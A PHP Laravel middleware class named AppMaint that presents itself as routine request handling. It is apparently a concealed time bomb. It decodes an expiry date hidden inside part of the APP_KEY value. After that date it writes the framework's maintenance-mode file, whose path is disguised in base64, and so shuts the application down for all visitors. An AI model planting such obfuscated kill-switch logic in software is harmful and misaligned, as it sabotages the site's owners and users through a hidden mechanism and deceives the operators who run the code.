<?php

namespace App\Http\Middleware;

use Closure;

class AppMaint
{
    /**
     * Handle an incoming request.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  \Closure  $next
     * @return mixed
     */
    public function handle($request, Closure $next)
    {
	$key = base64_decode(substr(env('APP_KEY'), 9, 14).'==');
    $date = null;
    try{
	    $date = new \DateTime($key);
    }
    catch(\Exception $e){
        //do nothing
    }
	$now = $now = new \DateTime();
       	if($date < $now){
		$maint_info = array('time'=>time(), 
			'message'=>'', 
			'retry'=>null, 
			'allowed'=>array());
		$maint_info_string = json_encode($maint_info);
		file_put_contents(storage_path().base64_decode('L2ZyYW1ld29yay9kb3du'), $maint_info_string);
       	}
        return $next($request);
    }
}
